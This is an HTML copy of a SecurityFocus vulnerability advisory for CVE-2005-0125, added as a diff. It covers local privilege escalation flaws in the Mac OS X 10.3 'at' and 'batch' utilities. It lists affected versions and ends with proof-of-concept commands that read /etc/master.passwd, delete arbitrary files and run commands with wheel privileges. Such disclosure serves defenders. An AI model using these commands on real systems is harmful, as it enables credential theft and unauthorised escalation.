@@ -1,0 +1,147 @@
+#SpeeDr00t@Black Falcon<br>#bid12297<p><b><span style="font-size: 18pt;">Apple Mac OS X At Utility Family Multiple Local Privilege Escalation Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/12297/info">info</a><br><a href="http://www.securityfocus.com/bid/12297/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/12297/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/12297/solution">solution</a><br><a href="http://www.securityfocus.com/bid/12297/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				12297
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Access Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2005-0125<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jan 18 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 12 2009 10:06AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery of this issue is credited to Immunity Inc.  Discovery of the 'batch' command issue is credited to KF &lt;kf_lists@digitalmunition.com&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Apple Mac OS X Server 10.3.7 <br/>
+					
+				
+					Apple Mac OS X Server 10.3.6 <br/>
+					
+				
+					Apple Mac OS X Server 10.3.5 <br/>
+					
+				
+					Apple Mac OS X Server 10.3.4 <br/>
+					
+				
+					Apple Mac OS X Server 10.3.3 <br/>
+					
+				
+					Apple Mac OS X Server 10.3.2 <br/>
+					
+				
+					Apple Mac OS X Server 10.3.1 <br/>
+					
+				
+					Apple Mac OS X Server 10.3 <br/>
+					
+				
+					Apple Mac OS X 10.3.7 <br/>
+					
+				
+					Apple Mac OS X 10.3.6 <br/>
+					
+				
+					Apple Mac OS X 10.3.5 <br/>
+					
+				
+					Apple Mac OS X 10.3.4 <br/>
+					
+				
+					Apple Mac OS X 10.3.3 <br/>
+					
+				
+					Apple Mac OS X 10.3.2 <br/>
+					
+				
+					Apple Mac OS X 10.3.1 <br/>
+					
+				
+					Apple Mac OS X 10.3 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Apple Mac OS X Server 10.3.8 <br/>
+					
+				
+					Apple Mac OS X 10.3.8 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	No exploit is required to leverage these issues.  The following proof of concept has been provided to view the master.passwd file:<br/><br/>tcsh% at Â­-f /etc/master.passwd 12:44<br/>Job a01194a36.001 will be executed using /bin/sh<br/>tcsh% cat /var/at/jobs/a01194a36.001<br/>tcsh% atrm a01194a36.001<br/><br/>The following proof of concept has been provided to remove arbitrary files from the affected computer:<br/><br/>tcsh% atrm fileName<br/><br/>Finally the following sequence will allow for the execution of the 'id' command with escalated privileges:<br/><br/>tcsh% echo &amp;gt; aa<br/>/usr/bin/id &amp;gt; /tmp/test<br/>tcsh% batch -f /tmp/aa 0<br/>Job b0118490c.000 will be executed using /bin/sh<br/>tcsh% cat /tmp/test<br/>cat: /tmp/test: No such file or directory<br/>(wait for the scheduled job to run)<br/>tcsh% cat /tmp/test<br/>uid=500(username) gid=0(wheel) groups=0(wheel), 1(daemon), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest), 80(admin)
+	
+		<ul>
+</ul>
+</div>
